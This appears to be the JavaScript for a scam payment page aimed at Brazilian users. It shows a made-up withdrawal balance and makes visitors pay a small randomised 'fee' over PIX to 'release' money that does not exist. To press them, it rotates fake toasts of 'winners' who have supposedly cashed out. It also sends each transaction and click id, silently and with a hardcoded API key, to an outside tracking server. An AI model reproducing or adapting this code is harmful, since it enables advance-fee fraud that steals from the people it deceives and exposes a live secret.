document.addEventListener("DOMContentLoaded", () => {
    // ===== Railway (Purchase garantido S2S) =====
    // Enquanto você não tiver Railway, deixe vazio que não faz nada.
    const RAILWAY_URL = "https://pix-purchase-railway-zuckpay-production.up.railway.app";       // ex: "https://seuapp.up.railway.app"
    const RAILWAY_API_KEY = "9aHgnfPRYaNx6QcBh3DFn05PiWP6t5WQ23";   // ex: "minha-chave-forte"

    function registrarPixNaRailway({ transactionId, pixCode, value }) {
        try {
            // Railway ainda não configurada? não faz nada.
            if (!RAILWAY_URL || !RAILWAY_API_KEY) return;

            const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
            if (!clickid || !transactionId) return;

            const payload = {
                transactionId: String(transactionId),
                clickid: String(clickid),
                value: Number(value) || 0,
                currency: "BRL",
                pixCode: pixCode || null // opcional
            };

            fetch(`${RAILWAY_URL}/pix-created`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "x-api-key": RAILWAY_API_KEY
                },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(() => { });
        } catch (e) {
            // silencioso de propósito
        }
    }

    // --- 1. SELETORES DE ELEMENTOS ---
    const loadingScreen = document.getElementById('loading-screen');
    const loadingBarFill = document.getElementById('loading-bar-fill');
    const mainContent = document.getElementById('main-content');
    const btnGerarPix = document.getElementById('btn-gerar-pix');

    // Seletores do Modal
    const modalPix = document.getElementById('modal-pix');
    const qrCodeImg = document.getElementById('qr-code-img');
    const inputPixCode = document.getElementById('pix-copia-cola');
    const expiraTimer = document.getElementById('expira-timer');

    let intervaloGanhadores = null;

    const listaGanhadores = [
        { nome: "Pedro H.", valor: "R$ 2.029,02", img: "https://i.pravatar.cc/150?img=11" },
        { nome: "Maria S.", valor: "R$ 1.733,92", img: "https://i.pravatar.cc/150?img=5" },
        { nome: "João P.", valor: "R$ 5.496,72", img: "https://i.pravatar.cc/150?img=12" },
        { nome: "Ana C.", valor: "R$ 850,50", img: "https://i.pravatar.cc/150?img=9" },
        { nome: "Lucas M.", valor: "R$ 3.120,00", img: "https://i.pravatar.cc/150?img=15" },
        { nome: "Juliana T.", valor: "R$ 1.050,00", img: "https://i.pravatar.cc/150?img=20" }
    ];

    function mostrarGanhador() {
        const toast = document.getElementById('toast-saque');
        const toastImg = document.getElementById('toast-img');
        const toastMensagem = document.getElementById('toast-mensagem');
        if (!toast) return;

        const ganhador = listaGanhadores[Math.floor(Math.random() * listaGanhadores.length)];
        toastImg.src = ganhador.img;
        toastMensagem.innerHTML = `${ganhador.nome} sacou <strong class="texto-verde">${ganhador.valor}</strong>`;

        toast.classList.add('show');
        setTimeout(() => { toast.classList.remove('show'); }, 3000);
    }

    // --- 2. LÓGICA DO LOADING INICIAL ---
    const tempoLoading = 3000;
    let progresso = 0;
    const intervalo = setInterval(() => {
        progresso += (100 / (tempoLoading / 30));
        if (progresso >= 100) {
            progresso = 100;
            clearInterval(intervalo);
            setTimeout(() => {
                if (loadingScreen) {
                    loadingScreen.style.opacity = "0";
                    setTimeout(() => {
                        loadingScreen.style.display = "none";
                        mainContent.style.display = "block";
                        setTimeout(() => { mainContent.style.opacity = "1"; }, 50);
                    }, 500);
                }
            }, 300);
        }
        if (loadingBarFill) loadingBarFill.style.width = `${progresso}%`;
    }, 30);

    // --- 3. FUNÇÃO DO CRONÔMETRO ---
    function iniciarCronometro(duracao, display) {
        if (!display) return;
        let timer = duracao, minutos, segundos;
        const contagem = setInterval(() => {
            minutos = parseInt(timer / 60, 10);
            segundos = parseInt(timer % 60, 10);
            display.textContent = (minutos < 10 ? "0" + minutos : minutos) + ":" + (segundos < 10 ? "0" + segundos : segundos);
            if (--timer < 0) clearInterval(contagem);
        }, 1000);
    }

    // --- 4. CONFIGURAÇÃO DE VALORES DINÂMICOS ---
    function configurarValoresDinamicos() {

        const taxa = (Math.random() * (34 - 32) + 32).toFixed(2);
        const saldoOriginal = 5496.72;

        const totalReceber = (
            parseFloat(taxa) + saldoOriginal
        ).toFixed(2);

        // FORMATO AMERICANO: $5,530.50
        const formatarUSD = (valor) => {
            return Number(valor).toLocaleString("en-US", {
                style: "currency",
                currency: "USD"
            });
        };

        // DATA AMERICANA: 11/08/2026
        const formatarDataEUA = (data = new Date()) => {
            return data.toLocaleDateString("en-US", {
                month: "2-digit",
                day: "2-digit",
                year: "numeric",
                timeZone: "America/New_York"
            });
        };

        const displayTaxa = document.getElementById("taxa-valor-display");

        if (displayTaxa) {
            displayTaxa.innerText = formatarUSD(taxa);
        }

        document.querySelectorAll(".taxa-texto-dinamico").forEach(el => {
            el.innerText = formatarUSD(taxa);
        });

        const displayTotal = document.getElementById("total-receber");

        if (displayTotal) {
            displayTotal.innerText = formatarUSD(totalReceber);
        }

        const displayData = document.getElementById("data-atual");

        if (displayData) {
            displayData.innerText = formatarDataEUA();
        }

    }

    function carregarDadosUsuario() {

        const dados = JSON.parse(
            localStorage.getItem("dadosSaquePix")
        ) || {};

        const metodoPagamento = localStorage.getItem("metodoPagamento");

        const nomeEl = document.getElementById("confirm-nome");
        const tipoEl = document.getElementById("confirm-tipo");
        const chaveEl = document.getElementById("confirm-chave");

        if (nomeEl) {
            nomeEl.innerText = dados.nomeCompleto || "Not provided";
        }

        if (tipoEl) {
            tipoEl.innerText = metodoPagamento || "Not selected";
        }

        if (chaveEl) {
            chaveEl.innerText = dados.chavePix || "---";
        }

    }

    // --- 6. AÇÃO DE GERAR PAGAMENTO ---
    if (btnGerarPix) {
        btnGerarPix.addEventListener('click', () => {
            btnGerarPix.innerHTML = "<i class='bx bx-loader-alt bx-spin'></i> Gerando PIX...";
            btnGerarPix.style.pointerEvents = "none";

            const taxaTexto = document.getElementById('taxa-valor-display').innerText;
            const valorLimpo = taxaTexto.replace(/[^\d,]/g, '').replace(',', '.');
            const dadosSalvos = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
            const utmSource = localStorage.getItem('utm_source') || '';

            // Usando FormData para enviar no formato que o PHP original lê
            const formData = new FormData();
            formData.append('nome', dadosSalvos.nomeCompleto || 'Usuario');
            formData.append('cpf', dadosSalvos.chavePix || '00000000000');
            formData.append('valor', valorLimpo);
            formData.append('utm_source', utmSource);

            fetch('gerar_pix.php', { method: 'POST', body: formData })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {

                        // 1. Preenche o input Copia e Cola
                        if (inputPixCode) inputPixCode.value = data.pix_code;

                        if (qrCodeImg) {
                            if (data.pix_qr_code) {
                                const qr = String(data.pix_qr_code).trim();

                                qrCodeImg.src = qr.startsWith('data:image')
                                    ? qr
                                    : `data:image/png;base64,${qr}`;
                            } else if (data.pix_code) {
                                qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pix_code)}`;
                            }
                        }
                        // 3. Registra os dados na Railway
                        registrarPixNaRailway({
                            transactionId: data.id,
                            pixCode: data.pix_code,
                            value: parseFloat(valorLimpo)
                        });

                        // 4. Abre o modal e mostra ganhadores
                        if (modalPix) {
                            modalPix.style.display = 'flex';
                            setTimeout(() => { modalPix.style.opacity = '1'; }, 10);
                            document.body.style.overflow = "hidden";

                            if (!intervaloGanhadores) {
                                setTimeout(mostrarGanhador, 1000);
                                intervaloGanhadores = setInterval(mostrarGanhador, 5000);
                            }
                        }

                        iniciarCronometro(60 * 7, expiraTimer);

                        // 5. Inicia verificação do status de pagamento
                        const verificarStatus = setInterval(() => {
                            fetch(`consultar_pagamento.php?id=${data.id}`)
                                .then(r => r.json())
                                .then(resNitro => {
                                    // Adicionada dupla verificação de status pago para garantir
                                    if (resNitro.pago || resNitro.status === 'PAID') {
                                        clearInterval(verificarStatus);
                                        setTimeout(() => {
                                            window.location.href = "/up1";
                                        }, 500);
                                    }
                                })
                                .catch(err => console.error("Erro na consulta:", err));
                        }, 4000);

                        btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                        btnGerarPix.style.pointerEvents = "auto";

                    } else {
                        alert("Falha: " + (data.message || "Erro ao gerar PIX"));
                        btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                        btnGerarPix.style.pointerEvents = "auto";
                    }
                })
                .catch(err => {
                    console.error(err);
                    alert("Erro de conexão com o servidor.");
                    btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                    btnGerarPix.style.pointerEvents = "auto";
                });
        });
    }

    // --- FUNÇÃO GLOBAL DE COPIAR PIX ---
    window.copiarPix = function () {
        if (!inputPixCode) return;
        inputPixCode.select();
        inputPixCode.setSelectionRange(0, 99999);
        try {
            document.execCommand("copy");
            alert("Código PIX copiado com sucesso!");
        } catch (err) {
            navigator.clipboard.writeText(inputPixCode.value);
            alert("Código PIX copiado!");
        }
    };

    configurarValoresDinamicos();
    carregarDadosUsuario();
});